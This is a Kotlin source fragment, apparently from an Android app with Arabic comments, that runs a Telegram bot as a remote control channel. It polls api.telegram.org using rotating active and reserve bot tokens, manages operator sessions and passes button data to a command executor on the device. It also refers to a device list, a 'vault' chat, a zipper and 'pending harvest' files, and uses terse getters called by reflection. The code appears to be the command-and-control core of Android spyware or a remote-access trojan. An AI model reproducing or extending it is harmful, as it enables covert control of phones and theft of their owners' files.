                    saveData()
                    val timeStr = SimpleDateFormat("HH:mm", Locale.US).format(Date(exp * 1000))
                    apiCall(
                        "answerCallbackQuery",
                        JSONObject().apply {
                            put("callback_query_id", cbId)
                            put("text", "✅ Session renewed until $timeStr")
                            put("show_alert", true)
                        }
                    )
                    return
                }
                data == "ext" -> {
                    sessionMutex.withLock {
                        sessions.remove(chatId.toString())
                    }
                    saveData()
                    apiCall(
                        "editMessageText",
                        JSONObject().apply {
                            put("chat_id", chatId)
                            put("message_id", msgId)
                            put("text", "🔒 Logged out.")
                        }
                    )
                    return
                }
                data == "main" -> {
                    apiCall(
                        "editMessageText",
                        JSONObject().apply {
                            put("chat_id", chatId)
                            put("message_id", msgId)
                            put("text", "📋 Main menu")
                            put("reply_markup", getMainKeyboard())
                        }
                    )
                    return
                }
            }

            // تمرير الأوامر الأخرى إلى Commands
            try {
                Commands.ex(appContext ?: return, data, this, monitor, chatId, cbId)
            } catch (e: Exception) {
                writeLog("Command error: ${e.message}")
                sendErrorReport(
                    "خطأ في تنفيذ الأمر",
                    mapOf(
                        "الأمر" to data,
                        "الاستثناء" to (e.message ?: "غير معروف"),
                        "الوقت" to SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                    )
                )
                apiCall(
                    "sendMessage",
                    JSONObject().apply {
                        put("chat_id", chatId)
                        put("text", "❌ Error: ${e.message?.take(100)}")
                    }
                )
            }
        } catch (e: Exception) {
            writeLog("Handle callback error: ${e.message}")
            sendErrorReport(
                "خطأ في معالجة الطلب",
                mapOf(
                    "الاستثناء" to (e.message ?: "غير معروف"),
                    "الوقت" to SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                )
            )
        }
    }

    // ============================================================
    //  حلقة استقبال التحديثات (Polling)
    // ============================================================

    private fun startPolling() {
        pollingJob = scope.launch {
            var offset = loadOffset()
            var consecutiveErrors = 0
            writeLog("Polling started with offset=$offset")
            while (isRunning && isActive) {
                val token = getNextToken()
                if (token == null) {
                    delay(5000L)
                    continue
                }
                try {
                    val url = "https://api.telegram.org/bot$token/getUpdates" +
                            "?offset=$offset&timeout=25&allowed_updates=[\"message\",\"callback_query\"]"
                    val request = Request.Builder()
                        .url(url)
                        .get()
                        .build()
                    val response = withContext(Dispatchers.IO) {
                        httpClient.newCall(request).execute()
                    }
                    val responseStr = response.body?.string() ?: ""
                    if (!response.isSuccessful) {
                        consecutiveErrors++
                        delay(minOf(consecutiveErrors * 2000L, 60000L))
                        continue
                    }
                    val data = JSONObject(responseStr)
                    if (data.optBoolean("ok")) {
                        consecutiveErrors = 0
                        val results = data.optJSONArray("result") ?: JSONArray()
                        for (i in 0 until results.length()) {
                            val upd = results.getJSONObject(i)
                            val updateId = upd.getLong("update_id")
                            val newOffset = updateId + 1
                            if (newOffset > offset) {
                                offset = newOffset
                                saveOffset(offset)
                            }
                            if (upd.has("message")) {
                                handleMessage(upd)
                            }
                            if (upd.has("callback_query")) {
                                handleCallback(upd)
                            }
                        }
                    } else {
                        delay(2000L)
                    }
                } catch (e: Exception) {
                    consecutiveErrors++
                    writeLog("Polling exception: ${e.message}")
                    delay(minOf(consecutiveErrors * 2000L, 30000L))
                }
            }
        }
    }

    // ============================================================
    //  إدارة دورة الحياة والحالة
    // ============================================================

    fun start(): Boolean {
        if (activeTokensList.isEmpty()) {
            writeLog("No active tokens, Telegram UI cannot start")
            return false
        }
        if (isRunning) return true
        isRunning = true
        processedUpdates.clear()
        startPolling()
        writeLog("Telegram UI started: ${activeTokensList.size} active, ${reserveTokensList.size} reserve")
        return true
    }

    fun stop() {
        isRunning = false
        pollingJob?.cancel()
        cleanerJob?.cancel()
        heartbeatJob?.cancel()
        writeLog("Telegram UI stopped")
    }

    fun getStatus(): Map<String, Any> {
        // ✅ لا نعرض التوكنات نفسها، بل الأعداد فقط
        return mapOf(
            "running" to isRunning,
            "active_tokens" to activeTokensList.size,
            "reserve_tokens" to reserveTokensList.size,
            "devices" to devices.size,
            "sessions" to sessions.size,
            "api_calls" to apiCallsCount,
            "api_failures" to apiFailuresCount,
            "pending_files" to countPendingHarvest()
        )
    }

    // ============================================================
    //  دوال إضافية مطلوبة للانعكاس (Reflection)
    // ============================================================

    /**
     * إرجاع معرف الخزنة (Vault ID) المستخدم في DailyZipper و Commands.
     */
    fun getVlt(): Long = config.vaultId

    /**
     * إرجاع معرف التحكم (Control ID) إذا لزم الأمر.
     */
    fun getCtrl(): Long = config.controlId

    /**
     * إرجاع معرف الدردشة الافتراضي (للتوافق مع الكود القديم).
     */
    fun getDat(): Long = config.vaultId

    // ============================================================
    //  دوال مساعدة (التسجيل والكتابة) - مع تعزيز الأمان
    // ============================================================

    private fun writeLog(message: String) {
        // ✅ لا تطبع أي توكنات - نثق أن المتصل لا يمرر توكنات كاملة
        // ولكن نضيف تحققاً إضافياً: إذا احتوى الرسالة على نمط توكن (طويل ويبدأ بأرقام)، نقوم بتقطيعه
        val safeMessage = if (message.length > 50 && message.matches(Regex("^\\d+:.*"))) {
            message.take(20) + "... (token hidden)"
        } else {
            message
        }
        Log.i(TAG, safeMessage)
        try {
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            val logText = "[$timestamp] [INFO] $safeMessage\n"
            logFile.appendText(logText, Charsets.UTF_8)
        } catch (_: Exception) {
            // تجاهل أخطاء التسجيل في الملف
        }
    }

    /**
     * استدعاء دالة على كائن عبر الانعكاس
     */
    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null
        return try {
            val method = target.javaClass.methods.firstOrNull { it.name == methodName }
            method?.isAccessible = true
            method?.invoke(target, *args)
        } catch (e: Exception) {
            writeLog("Method invocation error ($methodName): ${e.message}")
            null
        }
    }
}
